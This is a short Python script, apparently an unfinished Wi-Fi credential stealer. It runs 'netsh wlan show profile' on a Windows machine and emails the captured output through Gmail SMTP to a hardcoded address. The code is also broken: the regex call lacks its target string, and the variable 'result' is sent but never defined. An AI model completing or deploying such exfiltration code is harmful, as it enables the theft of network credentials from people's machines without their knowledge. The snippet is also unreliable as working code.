#!/usr/bin/env python

import smtplib
import subprocess
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names = re.search("Profile\s*:\s")

send_mail("tonysnarkathome@gmail.com", "password", result)

